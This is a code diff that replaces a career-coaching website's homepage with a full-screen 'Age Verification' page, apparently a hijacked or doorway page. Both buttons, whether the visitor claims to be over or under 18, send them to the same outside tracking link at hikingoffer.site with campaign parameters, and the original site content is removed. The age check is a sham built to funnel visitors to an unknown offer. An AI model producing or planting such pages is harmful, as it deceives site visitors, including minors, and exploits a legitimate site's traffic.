@@ -1,96 +1,161 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Neocycle – Career Reset & Skill Growth Systems</title>
-<link rel="stylesheet" href="style.css">
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style>    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Age Verification</title>
+      <style>   
+        /* Reset some basic styles */
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: 'Arial', sans-serif;
+            height: 100%;
+            overflow-x: hidden;
+        }
+
+        /* Background sections */
+        .background-section {
+            height: 100vh; /* Full viewport height */
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            position: relative;
+        }
+
+        /* Overlay for background sections */
+        .background-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5); /* Dark overlay */
+            z-index: 1;
+        }
+        /* Container for the age verification page, fixed in place */
+        .age-verification-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 500px;
+            height: 300px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border-radius: 10px;
+            box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.2);
+            background-color: white;
+            text-align: center;
+            padding: 20px;
+            z-index: 2; /* Ensure the container is above the overlay */
+        }
+
+        .logo {
+            max-width: 150px;
+            margin-bottom: 5px;
+        }
+
+        .content h1 {
+            font-size: 1.5rem;
+            margin-bottom: 20px;
+            color: #000;
+        }
+
+        .content p {
+            font-size: 1.2rem;
+            margin-bottom: 30px;
+            color: #000;
+        }
+
+        .buttons {
+            display: flex;
+            gap: 20px;
+            justify-content: center;
+        }
+
+        .btn {
+            background-color: #0081a1;
+            color: rgb(255, 255, 255);
+            padding: 10px 20px;
+            text-decoration: none;
+            font-size: 1.3rem;
+            font-weight: 700;
+            border-radius: 5px;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn:hover {
+            background-color: #0b00a1;
+        }
+
+        footer {
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+            width: 100%;
+        }
+
+        footer a {
+            color: #fff;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive styling */
+        @media (max-width: 480px) {
+            .age-verification-container {
+                width: 300px;
+                height: 300px;
+            }
+
+            .logo {
+                max-width: 100px;
+            }
+
+            .content h1 {
+                font-size: 15px;
+            }
+
+            .content p {
+                font-size: 0.9rem;
+            }
+
+            .btn {
+                padding: 8px 15px;
+                font-size: 0.9rem;
+            }
+              
+        }
+    </style>
 </head>
-<body>
-
-<header class="topbar">
-  <div class="brand">Neocycle</div>
-  <nav class="menu">
-    <a href="index.html">Home</a>
-    <a href="focus.html">Focus Reset</a>
-    <a href="growth.html">Growth Framework</a>
-    <a href="habits.html">Habit Builder</a>
-    <a href="blog.html">Blog</a>
-    <a href="contact.html">Contact</a>
-  </nav>
-</header>
-
-<section class="intro">
-  <h1>Rebuild Your Career With Smart Systems</h1>
-  <p>Neocycle helps working professionals escape stagnation by creating repeatable career growth frameworks.</p>
-  <a class="btn-primary" href="growth.html">Explore Framework</a>
-</section>
-
-<section class="split">
-  <div>
-    <h2>Why Motivation Fails</h2>
-    <p>Motivation is emotional and unstable. Neocycle replaces emotion-driven effort with repeatable systems that create long-term professional progress.</p>
-  </div>
-  <div>
-    <h2>The Cycle Method</h2>
-    <p>Our approach is built around learning cycles: Discover → Practice → Apply → Improve. Each cycle strengthens your career foundation.</p>
-  </div>
-</section>
-
-<section class="panels">
-  <div class="panel">
-    <h3>Career Reset</h3>
-    <p>Find direction when your professional path feels unclear.</p>
-  </div>
-  <div class="panel">
-    <h3>Skill Stacking</h3>
-    <p>Combine technical, communication, and problem-solving skills into one career asset.</p>
-  </div>
-  <div class="panel">
-    <h3>Momentum Planning</h3>
-    <p>Create weekly systems that move your career forward without burnout.</p>
-  </div>
-</section>
-
-<footer class="site-footer">
-  <p>© 2025 Neocycle. Built for modern professionals.</p>
-  <div>
-    <a href="privacy.html">Privacy</a> |
-    <a href="terms.html">Terms</a> |
-    <a href="cookies.html">Cookies</a>
-  </div>
-</footer>
-<!-- Age Verification Popup -->
-<div id="age-verification" class="age-overlay">
-  <div class="age-popup">
-    <h2>Important Notice</h2>
-        <p>This website is intended for informational and promotional purposes only. By continuing, you agree to our <a href="terms.html">Terms of Use</a> and <a href="privacy.html">Privacy Policy</a>.</p>
-    <div class="age-buttons">
-      <button id="btn-yes">Continue</button>
-      <button id="btn-no">No</button>
+<body cz-shortcut-listen="true">
+    <!-- Fixed age verification container -->
+    <div class="age-verification-container">
+        <div class="content">
+           
+            <h1>Age Verification</h1>
+            <p>You must be 18 or older to enter this site.</p>
+            <div class="buttons">
+                <a href="http://hikingoffer.site/?utm_campaign=bR2isr7GVw&v1=[v1]&v2=[v2]&v3=[v3]" class="btn enter">I am 18 or Older</a>
+                <a href="http://hikingoffer.site/?utm_campaign=bR2isr7GVw&v1=[v1]&v2=[v2]&v3=[v3]" class="btn exit">I am Under 18</a>
+            </div>
+        </div>
     </div>
-  </div>
-</div>
- 
-<script>
-  document.addEventListener("DOMContentLoaded", function () {
-    var yesBtn = document.getElementById("btn-yes");
-    var noBtn = document.getElementById("btn-no");
- 
-    // Change these URLs as you want
-    var yesLink = "/home/";  
-    var noLink = "/home/";  
- 
-    yesBtn.addEventListener("click", function () {
-      window.location.href = yesLink;
-    });
- 
-    noBtn.addEventListener("click", function () {
-      window.location.href = noLink;
-    });
-  });
-</script>
 
-</body>
-</html>
+    <!-- First background section -->
+    <div id="section1" class="background-section"></div>
 
+    <!-- Second background section -->
+    <div id="section2" class="background-section"></div>
+
+    <!-- Third background section -->
+    <div id="section3" class="background-section"></div>
+</body></html>
